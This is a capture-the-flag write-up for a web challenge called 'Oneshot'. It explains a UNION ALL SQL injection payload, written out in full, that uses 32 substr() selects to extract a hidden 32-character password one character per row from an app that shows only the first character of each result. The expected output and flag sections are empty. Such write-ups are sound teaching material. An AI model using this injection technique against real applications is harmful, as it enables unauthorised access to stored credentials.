# Oneshot

## Solution : 

So after getting the challenge i went to the site and tried to enter random words but I couldn't understand it at all,so i went over to check the src code of the web app, then from there I understood some of the logic, behind the app, so what I found was that the app generates a random session ID,and U can only do 1 search per session ID, and it also generates a random 32 bit hexadecimal password, which we need to find using that single search if we fail to find the password with that search the password and the session id both get changed, so we only have `oneshot` to do so, what I also noticed after going through it again and again was this line :
```python
"<li>" + row[0][0] + "*" * (len(row[0]) - 1) + "</li>"
```
what this line does is it print the first character of the password only, so we need to use SQL injection and insert the same line again and again to get the table where the password is stored and print it 32 times, so we construct a sql payload that will use `UNION ALL` to produce and preserve all rows from the table in order and woll use `substr()` to return 1 character each time so this way, if we type this 32 times it will return 32 characters. so the total command looks something like this
```
UNION ALL SELECT substr(password,1,1) FROM table_6b5f3c2a1e0d4f99
```
now this command we need to type 32 times so something like this
```
' UNION ALL SELECT substr(password,1,1) FROM table_6b5f3c2a1e0d4f99
UNION ALL SELECT substr(password,2,1) FROM table_6b5f3c2a1e0d4f99
UNION ALL SELECT substr(password,3,1) FROM table_6b5f3c2a1e0d4f99
UNION ALL SELECT substr(password,4,1) FROM table_6b5f3c2a1e0d4f99
UNION ALL SELECT substr(password,5,1) FROM table_6b5f3c2a1e0d4f99
UNION ALL SELECT substr(password,6,1) FROM table_6b5f3c2a1e0d4f99
UNION ALL SELECT substr(password,7,1) FROM table_6b5f3c2a1e0d4f99
UNION ALL SELECT substr(password,8,1) FROM table_6b5f3c2a1e0d4f99
UNION ALL SELECT substr(password,9,1) FROM table_6b5f3c2a1e0d4f99
UNION ALL SELECT substr(password,10,1) FROM table_6b5f3c2a1e0d4f99
UNION ALL SELECT substr(password,11,1) FROM table_6b5f3c2a1e0d4f99
UNION ALL SELECT substr(password,12,1) FROM table_6b5f3c2a1e0d4f99
UNION ALL SELECT substr(password,13,1) FROM table_6b5f3c2a1e0d4f99
UNION ALL SELECT substr(password,14,1) FROM table_6b5f3c2a1e0d4f99
UNION ALL SELECT substr(password,15,1) FROM table_6b5f3c2a1e0d4f99
UNION ALL SELECT substr(password,16,1) FROM table_6b5f3c2a1e0d4f99
UNION ALL SELECT substr(password,17,1) FROM table_6b5f3c2a1e0d4f99
UNION ALL SELECT substr(password,18,1) FROM table_6b5f3c2a1e0d4f99
UNION ALL SELECT substr(password,19,1) FROM table_6b5f3c2a1e0d4f99
UNION ALL SELECT substr(password,20,1) FROM table_6b5f3c2a1e0d4f99
UNION ALL SELECT substr(password,21,1) FROM table_6b5f3c2a1e0d4f99
UNION ALL SELECT substr(password,22,1) FROM table_6b5f3c2a1e0d4f99
UNION ALL SELECT substr(password,23,1) FROM table_6b5f3c2a1e0d4f99
UNION ALL SELECT substr(password,24,1) FROM table_6b5f3c2a1e0d4f99
UNION ALL SELECT substr(password,25,1) FROM table_6b5f3c2a1e0d4f99
UNION ALL SELECT substr(password,26,1) FROM table_6b5f3c2a1e0d4f99
UNION ALL SELECT substr(password,27,1) FROM table_6b5f3c2a1e0d4f99
UNION ALL SELECT substr(password,28,1) FROM table_6b5f3c2a1e0d4f99
UNION ALL SELECT substr(password,29,1) FROM table_6b5f3c2a1e0d4f99
UNION ALL SELECT substr(password,30,1) FROM table_6b5f3c2a1e0d4f99
UNION ALL SELECT substr(password,31,1) FROM table_6b5f3c2a1e0d4f99
UNION ALL SELECT substr(password,32,1) FROM table_6b5f3c2a1e0d4f99
-- 
```
so let me break this command down:
`UNION ALL` : will produce all the rows as we can only type 1 sql search and need all the characters this is the only way
`SELECT substr(password,0,1)` : so this part tells it to SELECT 1 chracter from the password, where the place where 0 is for the place from which we want the character and for and the place 1 is it tells the amount the characters we want so here we only want 1 per.
`FROM table_6b5f3c2a1e0d4f99` : it tells us from where to get this from.

when searched correctlty this is what it will produce :

now we just need to type the password correctly to get the flag.

Finally got the flag

## Flag :
